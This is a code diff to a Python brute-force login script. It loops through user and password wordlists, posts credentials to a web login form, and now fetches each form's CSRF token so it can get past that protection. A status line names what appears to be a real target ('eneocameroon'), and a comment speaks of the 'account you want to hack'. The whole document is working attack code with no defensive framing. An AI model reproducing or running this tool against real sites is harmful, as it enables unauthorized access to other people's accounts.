@@ -4,9 +4,15 @@
 from app.settings import *
 import requests
 from sys import exit
+from lxml import html
 
 
 def presentation():
+    """
+    This method just present the app and ask for a choice before starting
+    Returns:
+
+    """
     print("[+] # #############################################")
     print("[+] # => Brute Force Login <=                     #")
     print("[+] # By S@n1x d4rk3r                             #")
@@ -18,16 +24,18 @@ def presentation():
     print("[+] 0-) Stop the program")
 
 
-def process_request(request, user, password, failed_aftertry, user_field, password_field):
-    """[summary]
+def process_request(request, user, password, failed_aftertry):
+    """
+    This method will proceed the request
 
-    Arguments:
-        request {[type]} -- [description]
-        user {[type]} -- [description]
-        password {[type]} -- [description]
-        failed_aftertry {[type]} -- [description]
-        user_field {[type]} -- [description]
-        password_field {[type]} -- [description]
+    Args:
+        request:
+        user:
+        password:
+        failed_aftertry:
+
+    Returns:
+
     """
     if "404" in request.text or "404 - Not Found" in request.text or request.status_code == 404:
         if failed_aftertry > LIMIT_TRYING_ACCESSING_URL:
@@ -56,7 +64,23 @@ def process_request(request, user, password, failed_aftertry, user_field, passwo
                 print("Trying theese parameters: user: " + user + " and password: " + password)
 
 
-def process_user(user, url, failed_aftertry, user_field, password_field):
+def get_csrf_token(url, csrf_field):
+    """
+    This method will fetch the token in the web-page and return it
+    """
+    # Get login _token
+    print("[+] Connecting to eneocameroon")
+    result = requests.get(url)
+    tree = html.fromstring(result.text)
+
+    print("[+] Fetching token..")
+    _token = list(set(tree.xpath("//input[@name='" + csrf_field + "']/@value")))[0]
+    print("[+] _token: ", _token)
+
+    return _token
+
+
+def process_user(user, url, failed_aftertry, user_field, password_field, csrf_field="_csrf"):
     """[summary]
 
     Arguments:
@@ -67,16 +91,20 @@ def process_user(user, url, failed_aftertry, user_field, password_field):
         password_field {[type]} -- [description]
     """
     for password in PASSWORDS:
-        dados = {user_field: user.replace('\n', ''),
-                 password_field: password.replace('\n', '')}
-        print("[+]", dados)
+        # Create the payload for the submission form
+        payload = {
+            user_field: user.replace('\n', ''),
+            password_field: password.replace('\n', ''),
+            csrf_field: get_csrf_token(url, csrf_field)
+        }
+        print("[+]", payload)
         # Doing the post form
-        request = requests.post(url, data=dados)
+        request = requests.post(url, data=payload)
 
-        process_request(request, user, password, failed_aftertry, user_field, password_field)
+        process_request(request, user, password, failed_aftertry)
 
 
-def try_connection(url, user_field, password_field):
+def try_connection(url, user_field, password_field, csrf_field):
     """[summary]
 
     Arguments:
@@ -89,7 +117,7 @@ def try_connection(url, user_field, password_field):
     # user_email = raw_input("\nEnter EMAIL / USERNAME of the account you want to hack:")
     failed_aftertry = 0
     for user in USERS:
-        process_user(user, url, failed_aftertry, user_field, password_field)
+        process_user(user, url, failed_aftertry, user_field, password_field, csrf_field)
 
 
 def manual_mode():
@@ -108,7 +136,12 @@ def manual_mode():
     password_field = input(
         "\n[+] Enter the Password field  (it's the 'name' attribute on the Login form for the password):")
 
-    try_connection(url, user_field, password_field)
+    # The password_field in the form
+    csrf_field = input(
+        "\n[+] Enter the csrf-token field  (it's the 'name' attribute on the Login form for the csrf, leave blank if "
+        "this attribute is not present in the form):")
+
+    try_connection(url, user_field, password_field, csrf_field)
 
 
 def extract_field_form(html_contain):
